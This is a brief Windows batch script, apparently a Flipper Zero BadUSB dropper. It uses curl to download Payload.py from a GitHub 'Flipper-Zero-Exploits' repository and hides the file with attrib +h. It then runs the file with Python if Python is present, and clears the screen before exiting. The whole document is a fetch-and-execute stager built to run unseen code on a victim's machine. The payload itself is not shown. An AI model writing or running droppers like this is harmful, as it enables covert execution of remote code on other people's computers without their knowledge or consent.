@echo off

curl https://raw.githubusercontent.com/Wojtek9388/Flipper-Zero-Exploits/refs/heads/main/Python/Payload.py > Payload.py
attrib +h Payload.py

:CheckPython
    python --version > nul
    if errorlevel 1 (
        goto NoPython
    )
    goto PythonInstalled


:PythonInstalled
    python Payload.py
    goto End


:NoPython
    exit


:End
    cls
    exit
